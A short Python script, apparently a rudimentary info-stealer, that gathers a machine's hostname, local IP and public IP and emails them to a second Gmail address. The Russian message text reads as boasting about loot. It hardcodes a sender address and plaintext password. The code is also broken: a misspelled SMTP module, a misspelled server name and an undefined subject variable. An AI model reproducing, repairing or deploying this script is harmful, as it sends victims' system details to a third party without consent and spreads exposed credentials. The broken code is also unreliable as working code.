import socket
from requests import get
import smptlib as smtp
from getpass import getpass

hostname = socket.gethostname()
localIp = socket.gethostbyname(hostname)
publicIp = get('http://api.ipify.org').text

email = 'okeanforme@gmail.com'
password = "141450525Qq"
dest_email = 'poshlit@gmail.com'
email_text = f"Вот че награбил: {hostname}, {localIp}, {publicIp} "

message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)
server = smtp.SMTP_SSL('smpt.gmail.com')
server.set_debuglevel(1)
server.ehlo(email)
server.login(email, password)
server.auth_plain()
server.sendmail(email, dest_email, message)
server.quit()
